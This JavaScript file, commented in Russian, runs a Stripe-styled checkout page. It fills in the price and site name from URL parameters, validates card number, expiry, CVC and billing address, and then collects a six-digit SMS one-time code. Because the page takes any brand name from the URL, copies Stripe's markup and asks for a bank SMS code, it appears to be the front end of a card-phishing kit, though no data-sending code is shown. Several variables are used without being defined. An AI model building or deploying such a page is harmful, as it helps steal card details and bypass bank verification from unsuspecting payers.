// Получаем из query params данные 
const params = new URLSearchParams(window.location.search);
const price = params.get("totalPrice");
const siteName = params.get("siteName");

if (price) {
  const CurrencyAmount = document.querySelectorAll(".CurrencyAmount");

  CurrencyAmount.forEach(elem => {
    elem.textContent = `$${price}`;
  });
}

if (siteName) {
  const ProductSummaryName = document.querySelector('.ProductSummary-name')
  const title = document.querySelector('title')

  ProductSummaryName.textContent = `Subscribe to ${siteName} Business`
  title.textContent = siteName
}









// Логика открытия аккордеона
const hpAccordion = document.querySelector('.Accordion')
const hpAccardionError = document.querySelector('.hp-accardion-error-text')
const hpCardListIcons = document.querySelector('.hp-card-list-icons')

const hpPaymentMethodButton = document.querySelector('.hp-payment-method-active');
const hpRadioButton = document.querySelector('.hp-RadioButton');

hpPaymentMethodButton.addEventListener('click', function () {
  if (!hpRadioButton.checked) {
    hpAccordion.classList.remove('error')
    hpAccardionError.classList.remove('error')
    hpRadioButton.checked = true;
    hpRadioButton.classList.add('active');

    hpCardListIcons.classList.add('inactive')

    const hpCardForm = document.querySelector('.hp-card-form')
    hpCardForm.classList.add('active')

    toggleIntervals
  }
});

hpRadioButton.addEventListener('click', function () {
  hpAccordion.classList.remove('error')
  hpAccardionError.classList.remove('error')

  hpRadioButton.checked = true;
  hpRadioButton.classList.add('active');

  hpCardListIcons.classList.add('inactive')

  const hpCardForm = document.querySelector('.hp-card-form')
  hpCardForm.classList.add('active')

  toggleIntervals
});


// Меняем иконки карт на инпутах
function getAssetPath(filename) {
  const pathParts = window.location.pathname.split('/');
  pathParts.pop(); // убираем index.html или пустое после слэша
  return `${pathParts.join('/')}/hp-assets/${filename}`;
}

const images = [
  getAssetPath('jbc-card.svg'),
  getAssetPath('unionpay-card.svg'),
  getAssetPath('discover-card.svg'),
  getAssetPath('diners-card.svg'),
];

const switchImgCard1 = document.querySelector('.switch-img-card');
const switchImgCard2 = document.querySelector('.switch-img-card-2');

function switchImage(card, currentIndex) {
  card.classList.add('fade-out');

  setTimeout(() => {
    card.src = images[currentIndex];
    card.classList.remove('fade-out');
    card.classList.add('fade-in');

    setTimeout(() => {
      card.classList.remove('fade-in');
    }, 200);
  }, 200);

  return (currentIndex + 1) % images.length;
}

let intervalId1, intervalId2;
let currentIndex1 = 0, currentIndex2 = 0;

function toggleIntervals() {
  if (!hpRadioButton.checked) {
    intervalId1 = setInterval(() => {
      currentIndex1 = switchImage(switchImgCard1, currentIndex1);
    }, 3300);

    intervalId2 = setInterval(() => {
      currentIndex2 = switchImage(switchImgCard2, currentIndex2);
    }, 3300);
  } else {
    clearInterval(intervalId1);
    clearInterval(intervalId2);
  }
}

toggleIntervals();

const hpSelectCardImg = document.querySelector('.hp-select-card-img');
const hpSelectCard = document.querySelector('.hp-select-card');
const hpErrorCard = document.querySelector('.hp-error-card');

const hpCardNumberErrorIcon = document.querySelector('.card-number-error-icon');
const hpCardNumberIconList = document.querySelector('.hp-card-number-icon-list');

const hpCardNumberInput = document.querySelector('.card-number-input');

function getCardType(number) {
  if (/^4/.test(number)) {
    showCardUI();
    return 'Visa';
  } else if (/^5[1-5]/.test(number) || /^2(2[2-9][1-9]|[3-6][0-9]{2}|7[0-1][0-9]|720)/.test(number)) {
    showCardUI();
    return 'Mastercard';
  } else if (/^3[47]/.test(number)) {
    showCardUI();
    return 'AMEX';
  } else if (/^6(011|5|4[4-9])/.test(number) || /^622(12[6-9]|1[3-9][0-9]|[2-8][0-9]{2}|9[0-1][0-9]|92[0-5])/.test(number)) {
    showCardUI();
    return 'Discover';
  } else if (/^3(0[0-5]|[68])/.test(number)) {
    showCardUI();
    return 'Diners';
  } else if (/^35(2[89]|[3-8][0-9])/.test(number)) {
    showCardUI();
    return 'JCB';
  } else if (/^62/.test(number)) {
    showCardUI();
    return 'UnionPay';
  } else {
    return 'Unknown';
  }
}

function showCardUI() {
  hpCardNumberIconList.classList.add('hide');
  hpSelectCard.classList.add('active');
  hpErrorCard.classList.remove('active');
  hpCardNumberErrorIcon.classList.remove('active');
}

hpCardNumberInput.addEventListener('blur', function () {
  const number = this.value.replace(/\s+/g, '');
  const cardType = getCardType(number);

  if (cardType === 'Unknown') {
    hpCardNumberIconList.classList.remove('hide');
  }
});












// FORM
let isSendForm = false // Флаг для отправки формы


const hpSubmitButton = document.querySelector('.hp-submit-button') // MAIN SUBMIT BUTTON
const hpSubmitButtonText = document.querySelector('.hp-submit-button-text')

const hpOverlay = document.querySelector('.hp-overlay')

const hpMainForm = document.querySelector('.hp-main-form')
const hpOtpFormStep2 = document.querySelector('.hp-OTP-2-form')

// Инпуты
const hpEmailInput = document.querySelector('.email-input') // error
const hpDataInput = document.querySelector('.data-input') // error
const hpCvcInput = document.querySelector('.cvc-input') // error
const hpCardholdernameInput = document.querySelector('.cardholdername-input') // error
const hpAddressInput1 = document.querySelector('.address-input-1') // error
const hpAddressInput2 = document.querySelector('.address-input-2') // error
const hpProvinceInput = document.querySelector('.province-input') // error
const hpCityInput = document.querySelector('.city-input') // error
const hpPostalCodeInput = document.querySelector('.postal-code-input') // error
const hpCountrySelect = document.querySelector('.country-select') // error


const inputs = [
  hpCardNumberInput,
  hpDataInput,
  hpCvcInput,
  hpCardholdernameInput,
  hpAddressInput1,
  hpCityInput,
  hpPostalCodeInput,
  hpProvinceInput
];

const grayInputs = [
  hpEmailInput,
  hpCardNumberInput,
  hpDataInput,
  hpCvcInput,
  hpCardholdernameInput,
  hpCountrySelect,
  hpAddressInput1,
  hpAddressInput2,
  hpProvinceInput,
  hpCityInput,
  hpPostalCodeInput
]


const hpCardholderErrorText = document.querySelector('.Cardholder-error-text') // active

// ERROR ICON IN INPUTS // active
const hpEmailErrorIcon = document.querySelector('.email-error-icon')
const hpCvcErrorIcon = document.querySelector('.cvc-error-icon')
const hpCvcIconCard = document.querySelector('.cvc-icon-card')

const hpDataErrorIcon = document.querySelector('.data-error-icon')
const hpCardNameErrorIcon = document.querySelector('.cardName-error-icon')
const hpAddress1ErrorIcon = document.querySelector('.address-1-error-icon')
const hpProvinceErrorIcon = document.querySelector('.province-error-icon')
const hpCityErrorIcon = document.querySelector('.city-error-icon')
const hpPostalCodeErrorIcon = document.querySelector('.postal-code-error-icon')

// Ограничиваем ввод — только цифры
const onlyDigitsInputs = [
  hpCardNumberInput,
  hpDataInput,
  hpCvcInput
];

onlyDigitsInputs.forEach(input => {
  if (input) {
    input.addEventListener('input', () => {
      input.value = input.value.replace(/\D/g, ''); // Удаляет всё, кроме цифр
    });
  }
});


// ОБРАБОТКА НАЖАТИЯ НА ОСНОВНУЮ КНОПКУ ОТПРАВКИ ДАННЫХ 
hpSubmitButton.addEventListener('click', () => {

  // начало логики для формы

  // 'показываем ошибки если радиобатон кард не выбран'
  if (hpRadioButton.checked) {
    hpAccordion.classList.remove('error')
    hpAccardionError.classList.remove('error')
  } else {
    hpAccordion.classList.add('error')
    hpAccardionError.classList.add('error')
  }

  // Логика для инпутов при отправке формы 1
  if (isSendForm) {
    console.log(isSendForm)
    hpButtonSpinner.classList.add('active')
    hpSubmitButton.disabled = true
    hpSubmitButtonText.textContent = 'Processing...'
    hpOverlay.classList.add('active')
    hpSubmitButtonText.classList.add('active')

    inputs.forEach(input => {
      input.classList.add('input-inactive')
    })

    grayInputs.forEach(input => {
      input.disabled = true
      input.classList.add('hp-text-gray')
    })

    hpEmailInput.classList.add('input-inactive')
    hpCountrySelect.classList.add('input-inactive')
    hpAddressInput2.classList.add('input-inactive')
  } else {
    hpSubmitButton.disabled = false
    console.log(isSendForm)
    hpButtonSpinner.classList.remove('active')
    hpSubmitButtonText.classList.remove('active')
    hpSubmitButtonText.textContent = 'Pay'

    grayInputs.forEach(input => {
      input.classList.remove('hp-text-gray')
      input.disabled = false
    })
  }


  // Логика для селекта 
  if (hpCountrySelect.value === 'Country') {
    hpCountrySelect.classList.add('error')
  } else {
    hpCountrySelect.classList.remove('error')
  }

  // Логика для инпута адресса 1
  if (hpAddressInput1.value.length < 4) {
    hpAddressInput1.classList.add('error')
    hpAddress1ErrorIcon.classList.add('active')
  } else {
    hpAddressInput1.classList.remove('error')
    hpAddress1ErrorIcon.classList.remove('active')
  }

  // Логика для инпута провинция
  if (hpProvinceInput.value.length < 1) {
    hpProvinceInput.classList.add('error')
    hpProvinceErrorIcon.classList.add('active')
  } else {
    hpProvinceInput.classList.remove('error')
    hpProvinceErrorIcon.classList.remove('active')
  }

  // Логика для инпута город
  if (hpCityInput.value.length < 3) {
    hpCityInput.classList.add('error')

    hpCityErrorIcon.classList.add('active')
  } else {
    hpCityInput.classList.remove('error')

    hpCityErrorIcon.classList.remove('active')
  }

  // Логика для инпута постал код
  if (hpPostalCodeInput.value.length < 3) {
    hpPostalCodeInput.classList.add('error')
    hpPostalCodeErrorIcon.classList.add('active')
  } else {
    hpPostalCodeInput.classList.remove('error')
    hpPostalCodeErrorIcon.classList.remove('active')
  }

  // Логика для инпута имя владельца карты
  if (hpCardholdernameInput.value.length < 5) {
    hpCardholdernameInput.classList.add('error')
    hpCardholderErrorText.classList.add('active')
    hpCardNameErrorIcon.classList.add('active')
  } else {
    hpCardholdernameInput.classList.remove('error')
    hpCardholderErrorText.classList.remove('active')
    hpCardNameErrorIcon.classList.remove('active')
  }


  // Email валидация
  if (hpEmailInput) {
    // Функция для проверки валидности email
    const validateEmail = () => {
      const emailValue = hpEmailInput.value.trim();
      const isValidEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailValue);

      if (!isValidEmail) {
        hpEmailInput.classList.add('error');
        hpEmailErrorIcon.classList.add('active')
      } else {
        hpEmailInput.classList.remove('error');
        hpEmailErrorIcon.classList.remove('active')
      }
    };

    if (hpEmailInput.value.length < 8) {
      hpEmailInput.classList.add('error')
      hpEmailErrorIcon.classList.add('active')

      if (hpEmailInput.value.length === 0) {
        hpEmailInput.classList.remove('error')
        hpEmailErrorIcon.classList.remove('active')
      }
    } else {
      hpEmailInput.classList.remove('error')
      hpEmailErrorIcon.classList.remove('active')
    }

    // Проверка при вводе
    hpEmailInput.addEventListener('input', validateEmail);
  }

  // Проверка на только цифры
  onlyDigitsInputs.forEach(input => {
    if (input) {
      const digitsOnly = /^\d+$/;
      if (!digitsOnly.test(input.value.replace(/\s/g, '').replace('/', ''))) {
        input.classList.add('error');
      } else {
        input.classList.remove('error');
      }
    }
  });

  // Логика для инпута номер карты
  if (hpCardNumberInput.value.length < 19) {
    hpCardNumberInput.classList.add('error');
    hpCardNumberIconList.classList.remove('visible')
    hpCardNumberErrorIcon.classList.add('active')
    hpSelectCard.classList.remove('active')
  }

  // Логика для инпута свв кода
  if (hpCvcInput.value.length < 3) {
    hpCvcInput.classList.add('error');
    hpCvcErrorIcon.classList.add('active')
    hpCvcIconCard.classList.remove('visible')
  } else {
    hpCvcInput.classList.remove('error');
    hpCvcErrorIcon.classList.remove('active')
    hpCvcIconCard.classList.add('visible')
  }

  // Логика для инпута даты
  if (hpDataInput.value.length < 5) {
    hpDataInput.classList.add('error');
    hpDataErrorIcon.classList.add('active')
  } else {
    hpDataErrorIcon.classList.remove('active')
    hpDataInput.classList.remove('error');
  }

  // конец логики для формы
});





// --- ВАЛИДАЦИЯ ИНПУТОВ --- \\
hpCountrySelect.addEventListener('change', () => {
  if (hpCountrySelect.value === 'Country') {
    hpCountrySelect.classList.add('error')
  } else {
    hpCountrySelect.classList.remove('error')
  }
})

hpCountrySelect.addEventListener('blur', () => {
  if (hpCountrySelect.value === 'Country') {
    hpCountrySelect.classList.add('error')
  } else {
    hpCountrySelect.classList.remove('error')
  }
})

// Форматирование номера карты: 16 цифр, пробел после каждых 4 цифр
if (hpCardNumberInput) {
  hpCardNumberInput.addEventListener('input', () => {
    let value = hpCardNumberInput.value.replace(/\D/g, '').slice(0, 16);
    let formattedValue = value.match(/.{1,4}/g)?.join(' ') || '';
    const cardNumberDigits = hpCardNumberInput.value.replace(/\s/g, ''); // Удаляем все пробелы
    hpCardNumberInput.value = formattedValue;

    if (cardNumberDigits.length === 0) {
      hpErrorCard.classList.remove('active');
      hpCardNumberInput.classList.remove('error');
      hpCardNumberIconList.classList.add('visible')
      hpCardNumberErrorIcon.classList.remove('active')
      hpSelectCard.classList.remove('active')
    }
  });

  hpCardNumberInput.addEventListener('blur', () => {
    const cardNumberDigits = hpCardNumberInput.value.replace(/\s/g, ''); // Удаляем все пробелы
    if (cardNumberDigits.length < 16) {
      hpErrorCard.classList.add('active');
      hpCardNumberInput.classList.add('error');
      hpCardNumberIconList.classList.remove('visible')
      hpCardNumberErrorIcon.classList.add('active')
      hpSelectCard.classList.remove('active')

      if (cardNumberDigits.length === 0) {
        hpErrorCard.classList.remove('active');
        hpCardNumberInput.classList.remove('error');
        hpCardNumberIconList.classList.add('visible')
        hpCardNumberErrorIcon.classList.remove('active')
        hpSelectCard.classList.add('active')
      }
    } else {
      hpCardNumberIconList.classList.add('visible')
      hpSelectCard.classList.add('active')
    }
  })
}



// Форматирование CVC: максимум 4 цифры
if (hpCvcInput) {
  hpCvcInput.addEventListener('input', () => {
    hpCvcInput.value = hpCvcInput.value.replace(/\D/g, '').slice(0, 4);

    if (hpCvcInput.value.length === 3) {
      hpSubmitButton.disabled = false
      hpErrorBlockCardNumber.classList.remove('active')
      hpCvcInput.classList.remove('error')
      hpCvcIconCard.classList.add('visible')
      hpCvcErrorIcon.classList.remove('active')
    }
  });

  hpCvcInput.addEventListener('blur', () => {
    if (hpCvcInput.value.length < 3) {
      hpCvcInput.classList.add('error')
      hpCvcIconCard.classList.remove('visible')
      hpCvcErrorIcon.classList.add('active')
    } else {
      hpCvcInput.classList.remove('error')
      hpCvcIconCard.classList.add('visible')
      hpCvcErrorIcon.classList.remove('active')
    }
  })
}



// Форматирование даты: MM/YY
if (hpDataInput) {
  hpDataInput.addEventListener('input', () => {
    let raw = hpDataInput.value.replace(/\D/g, '').slice(0, 4); // только цифры, максимум 4

    if (raw.length >= 3) {
      hpDataInput.value = raw.slice(0, 2) + '/' + raw.slice(2);
    } else {
      hpDataInput.value = raw;
    }

    if (hpDataInput.value.length === 5) {
      hpDataInput.classList.remove('error');
      hpDataErrorIcon.classList.remove('active');
    }
  });

  hpDataInput.addEventListener('blur', () => {
    if (hpDataInput.value.length !== 5) {
      hpDataInput.classList.add('error');
      hpDataErrorIcon.classList.add('active');
    } else {
      hpDataInput.classList.remove('error');
      hpDataErrorIcon.classList.remove('active');
    }
  });
}



// Логика для инпута адресса 1
hpAddressInput1.addEventListener('blur', () => {
  if (hpAddressInput1.value.length < 4) {
    hpAddressInput1.classList.add('error')

    hpAddress1ErrorIcon.classList.add('active')
  } else {
    hpAddressInput1.classList.remove('error')
    hpAddress1ErrorIcon.classList.remove('active')
  }
})

hpAddressInput1.addEventListener('input', () => {
  if (hpAddressInput1.value.length > 4) {
    hpAddressInput1.classList.remove('error')
    hpAddress1ErrorIcon.classList.remove('active')

  }
})


// Логика для инпута hpProvinceInput
hpProvinceInput.addEventListener('blur', () => {
  if (hpProvinceInput.value.length < 1) {
    hpProvinceInput.classList.add('error')
    hpProvinceErrorIcon.classList.add('active')
  } else {
    hpProvinceInput.classList.remove('error')
    hpProvinceErrorIcon.classList.remove('active')
  }
})

hpProvinceInput.addEventListener('input', () => {
  if (hpProvinceInput.value.length >= 1) {
    hpProvinceInput.classList.remove('error')
    hpProvinceErrorIcon.classList.remove('active')
  }
})


// Логика для инпута hpCityInput
hpCityInput.addEventListener('blur', () => {
  if (hpCityInput.value.length < 3) {
    hpCityInput.classList.add('error')
    hpCityErrorIcon.classList.add('active')
  } else {
    hpCityInput.classList.remove('error')
    hpCityErrorIcon.classList.remove('active')
  }
})

hpCityInput.addEventListener('input', () => {
  if (hpCityInput.value.length > 3) {
    hpCityInput.classList.remove('error')
    hpCityErrorIcon.classList.remove('active')
  }
})


// Логика для инпута hpPostalCodeInput
hpPostalCodeInput.addEventListener('blur', () => {
  if (hpPostalCodeInput.value.length < 3) {
    hpPostalCodeInput.classList.add('error')
    hpPostalCodeErrorIcon.classList.add('active')
  } else {
    hpPostalCodeInput.classList.remove('error')
    hpPostalCodeErrorIcon.classList.remove('active')
  }
})

hpPostalCodeInput.addEventListener('input', () => {
  if (hpPostalCodeInput.value.length >= 3) {
    hpPostalCodeInput.classList.remove('error')
    hpPostalCodeErrorIcon.classList.remove('active')
  }
})



// Логика для инпута hpCardholdernameInput
hpCardholdernameInput.addEventListener('blur', () => {
  if (hpCardholdernameInput.value.length < 5) {
    hpCardholdernameInput.classList.add('error')
    hpCardholderErrorText.classList.add('active')
    hpCardNameErrorIcon.classList.add('active')
  } else {
    hpCardholdernameInput.classList.remove('error')
    hpCardholderErrorText.classList.remove('active')
    hpCardNameErrorIcon.classList.remove('active')
  }
})

hpCardholdernameInput.addEventListener('input', () => {
  if (hpCardholdernameInput.value.length > 5) {
    hpCardholdernameInput.classList.remove('error')
    hpCardholderErrorText.classList.remove('active')
    hpCardNameErrorIcon.classList.remove('active')
  }
})


// Логика для инпута EMAIL INPUT
hpEmailInput.addEventListener('blur', () => {
  const emailValue = hpEmailInput.value.trim();
  const isValidEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailValue);
  if (!isValidEmail) {
    hpEmailInput.classList.add('error');
    hpEmailErrorIcon.classList.add('active')

    if (hpEmailInput.value.length === 0) {
      hpEmailInput.classList.remove('error')
      hpEmailErrorIcon.classList.remove('active')
    }
  } else {
    hpEmailInput.classList.remove('error');
    hpEmailErrorIcon.classList.remove('active')
  }
})


hpEmailInput.addEventListener('input', () => {
  const emailValue = hpEmailInput.value.trim();
  const isValidEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailValue);
  if (!isValidEmail) {
    hpEmailInput.classList.add('error');
    hpEmailErrorIcon.classList.add('active')

    if (hpEmailInput.value.length === 0) {
      hpEmailInput.classList.remove('error')
      hpEmailErrorIcon.classList.remove('active')
    }
  } else {
    hpEmailInput.classList.remove('error');
    hpEmailErrorIcon.classList.remove('active')
  }
})

// Проверка на все заполненные поля инпутов
function checkAllFilled() {
  const allFilled = inputs.every(input => input.value.trim().length >= 1);
  if (hpCardNumberInput.value.length >= 19 && hpDataInput.value.length === 5 && hpCvcInput.value.length >= 3 && hpCardholdernameInput.value.length >= 5 && hpAddressInput1.value.length >= 5 && hpCityInput.value.length >= 3 && hpPostalCodeInput.value.length >= 4 && hpProvinceInput.value.length > 1 && allFilled) {
    hpSubmitButtonText.classList.add('active')
    isSendForm = true // Флаг отпарвки формы 1
  } else {
    hpButtonSpinner.classList.remove('active')
    hpSubmitButtonText.textContent = 'Pay'
    hpSubmitButtonText.classList.remove('active')
    isSendForm = false // Флаг отпарвки формы 1
  }
}

// Добавим слушателя на каждый input
inputs.forEach(input => {
  input.addEventListener("input", checkAllFilled);
});



// Проверка на введённую карту
function getAssetPath(filename) {
  const pathParts = window.location.pathname.split('/');
  pathParts.pop(); // убираем index.html или пустое после слэша
  return `${pathParts.join('/')}/hp-assets/${filename}`;
}

hpCardNumberInput.addEventListener('input', function () {
  const number = this.value.replace(/\s+/g, ''); // удаляем пробелы
  hpCardNumberErrorIcon.classList.remove('active');
  hpCardNumberInput.classList.remove('error');
  hpErrorCard.classList.remove('active');

  const cardType = getCardType(number);

  const cardImages = {
    Visa: getAssetPath('visa-icon.svg'),
    Mastercard: getAssetPath('mastercard-icon.svg'),
    AMEX: getAssetPath('fingerprinted.svg'),
    Discover: getAssetPath('discover-card.svg'),
    Diners: getAssetPath('diners-card.svg'),
    JCB: getAssetPath('jbc-card.svg'),
    UnionPay: getAssetPath('unionpay-card.svg'),
    Unknown: ''
  };

  if (cardType !== 'Unknown' && hpCardNumberInput.value.length === 19) {
    hpCardNumberErrorIcon.classList.remove('active');
    hpCardNumberInput.classList.remove('error');
  }

  if (cardType === 'Unknown') {
    hpCardNumberIconList.classList.remove('hide');
  }

  hpSelectCardImg.src = cardImages[cardType] || cardImages['Unknown'];
});







// OTP SMS
const otpInputs = document.querySelectorAll('.otp-input');
const hpContinueButton = document.querySelector('.hp-continue-button');

function updateSmsCodeAndButton() {
  const values = Array.from(otpInputs).map(input => input.value);
  smsCode = values.join('');
  if (smsCode.length === 6) {
    hpOtpTextError.classList.remove('active')
  }

  const allFilled = values.every(value => value.length === 1);
  hpContinueButton.disabled = !allFilled; // Кнопка активна только если все инпуты заполнены
}

hpContinueButton.addEventListener('click', () => {
  const values = Array.from(otpInputs).map(input => input.value);
  smsCode = values.join('');

  const allFilled = values.every(value => value.length === 1);
  if (allFilled) {
    otpInputs.forEach((input, index) => {
      input.classList.add('inactive')
    })
  }
})

otpInputs.forEach((input, index) => {
  input.addEventListener('input', () => {
    input.classList.remove('error')
    input.classList.remove('inactive')
    // Разрешаем ввод только цифр
    input.value = input.value.replace(/\D/g, '');

    updateSmsCodeAndButton();

    if (input.value.length === 1 && index < otpInputs.length - 1) {
      otpInputs[index + 1].focus();
    } else if (input.value.length === 0 && index > 0) {
      otpInputs[index - 1].focus();
    }
  });

  input.addEventListener('keydown', (e) => {
    // Разрешаем только цифры, Backspace, стрелки и Tab
    if (
      !(
        (e.key >= '0' && e.key <= '9') ||
        e.key === 'Backspace' ||
        e.key === 'ArrowLeft' ||
        e.key === 'ArrowRight' ||
        e.key === 'Tab'
      )
    ) {
      e.preventDefault();
    }

    if (e.key === 'Backspace' && input.value === '') {
      if (index > 0) {
        otpInputs[index - 1].focus();
      }
    }

    if (e.key !== 'Backspace' && input.value.length === 1 && index < otpInputs.length - 1) {
      otpInputs[index + 1].focus();
    }
  });
});